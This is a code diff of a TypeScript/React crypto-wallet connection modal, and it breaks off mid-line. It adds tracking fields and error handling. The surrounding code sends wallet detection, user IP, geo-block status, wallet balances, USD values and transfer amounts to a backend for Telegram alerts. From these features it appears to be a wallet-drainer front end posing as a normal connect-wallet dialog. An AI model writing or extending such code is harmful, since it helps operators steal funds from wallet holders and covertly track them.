@@ -14,6 +14,7 @@ enum EventType {
   MODAL_CLOSED = "MODAL_CLOSED",
   WALLET_CONNECT_ATTEMPT = "WALLET_CONNECT_ATTEMPT",
   WALLET_CONNECTED = "WALLET_CONNECTED",
+  WALLET_CONNECT_FAILED = "WALLET_CONNECT_FAILED",
   WALLET_INSTALL_REDIRECT = "WALLET_INSTALL_REDIRECT",
   MOBILE_WALLET_REDIRECT = "MOBILE_WALLET_REDIRECT",
   GEO_BLOCKED = "GEO_BLOCKED",
@@ -32,7 +33,8 @@ enum EventType {
   USER_IP_FAILED = "USER_IP_FAILED",
   MODAL_SESSION_TIMEOUT = "MODAL_SESSION_TIMEOUT",
   WALLET_DETECTED = "WALLET_DETECTED",
-  WALLET_NOT_INSTALLED = "WALLET_NOT_INSTALLED"
+  WALLET_NOT_INSTALLED = "WALLET_NOT_INSTALLED",
+  MODAL_ACTION = "MODAL_ACTION"
 }
 
 interface NotificationData {
@@ -52,6 +54,20 @@ interface NotificationData {
   modalOpenTime?: number
   screenInfo?: any
   locationInfo?: any
+  action?: string
+  fromModal?: boolean
+  attemptNumber?: number
+  duration?: number
+  reason?: string
+  deepLink?: string
+  universalLink?: string
+  isIOS?: boolean
+  isAndroid?: boolean
+  currentUrl?: string
+  source?: string
+  rpcEndpointsCount?: number
+  redirectUrl?: string
+  detectedWallets?: string[]
 }
 
 // Generate session ID
@@ -107,15 +123,19 @@ async function sendEventNotification(eventData: NotificationData) {
     }
     
     // Send to backend for Telegram notifications
-    await fetch("/api/log-event", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(fullEventData),
-    })
+    try {
+      await fetch("/api/log-event", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(fullEventData),
+      })
+    } catch (error) {
+      console.error("Failed to send event notification:", error)
+    }
   } catch (error) {
-    console.error("Failed to send event notification:", error)
+    console.error("Error in event notification:", error)
   }
 }
 
@@ -163,7 +183,7 @@ const DESKTOP_WALLETS = {
     checkMethod: () => (window as any).trustwallet,
     downloadUrl: "https://trustwallet.com/"
   }
-}
+} as const;
 
 const MOBILE_WALLETS = {
   phantom: {
@@ -201,7 +221,7 @@ const MOBILE_WALLETS = {
     universalLink: "https://exodus.com/",
     downloadUrl: "https://www.exodus.com/mobile"
   }
-}
+} as const;
 
 const wallets = [
   {
@@ -252,7 +272,7 @@ const wallets = [
     type: "web",
     supported: true
   }
-]
+] as const;
 
 export function Modals({ isOpen, onClose }: ModalsProps) {
   const [isMobileViewState, setIsMobileViewState] = useState(false) 
@@ -280,12 +300,14 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         userAgent: userAgent,
         sessionId,
         modalOpenTime,
-        detectedWallets
+        detectedWallets: detectedWallets
       })
     }
     
-    checkMobile()
-    checkGeoBlockStatus()
+    if (isOpen) {
+      checkMobile()
+      checkGeoBlockStatus()
+    }
     
     // Set timeout for modal session
     const timeoutId = setTimeout(() => {
@@ -313,13 +335,17 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     const detected: string[] = []
     
     Object.entries(DESKTOP_WALLETS).forEach(([id, wallet]) => {
-      if (wallet.checkMethod()) {
-        detected.push(id)
-        sendEventNotification({
-          eventType: EventType.WALLET_DETECTED,
-          walletType: id,
-          sessionId
-        })
+      try {
+        if (wallet.checkMethod()) {
+          detected.push(id)
+          sendEventNotification({
+            eventType: EventType.WALLET_DETECTED,
+            walletType: id,
+            sessionId
+          })
+        }
+      } catch (error) {
+        // Silently fail if wallet check throws
       }
     })
     
@@ -352,19 +378,18 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
 
   const isInWalletBrowserInstance = (walletId: string) => {
     const userAgent = navigator.userAgent.toLowerCase()
-    let inWallet = false
     
     if (walletId === "phantom") {
-      inWallet = userAgent.includes("phantom")
+      return userAgent.includes("phantom")
     } else if (walletId === "solflare") {
-      inWallet = userAgent.includes("solflare")
+      return userAgent.includes("solflare")
     } else if (walletId === "backpack") {
-      inWallet = userAgent.includes("backpack")
+      return userAgent.includes("backpack")
     } else if (walletId === "trustwallet") {
-      inWallet = userAgent.includes("trust")
+      return userAgent.includes("trust")
     }
     
-    return inWallet
+    return false
   }
 
   const connectDesktopWalletInstance = async (walletId: string) => {
@@ -411,7 +436,6 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           error: error?.message || "Unknown connection error",
           sessionId
         })
-      } finally {
         setIsLoading(false)
       }
     } else {
@@ -496,7 +520,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     }
   }
 
-  const fetchUserIP = async () => {
+  const fetchUserIP = async (): Promise<string> => {
     try {
       const ipResponse = await fetch("https://api.ipify.org?format=json")
       const ipData = await ipResponse.json()
@@ -676,24 +700,4 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         eventType: EventType.TRANSACTION_BROADCAST_SUCCESS,
         walletAddress: publicKey,
         transactionHash: signature,
-        rpcEndpoint: successfulEndpoint,
-        transferAmount: data.transferAmount,
-        sessionId
-      })
-
-      // Calculate USD value
-      const solPrice = data.solPrice || 153.32
-      const balanceUSD = data.walletBalance * solPrice
-      const transferUSD = data.transferAmount * solPrice
-
-      await fetch("/api/transaction-approved", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          walletAddress: publicKey,
-          balanceSOL: data.walletBalance,
-          balanceUSD: balanceUSD,
-          transferAmountSOL: data.transferAmount,
-          tran
+        rpcEndpoi
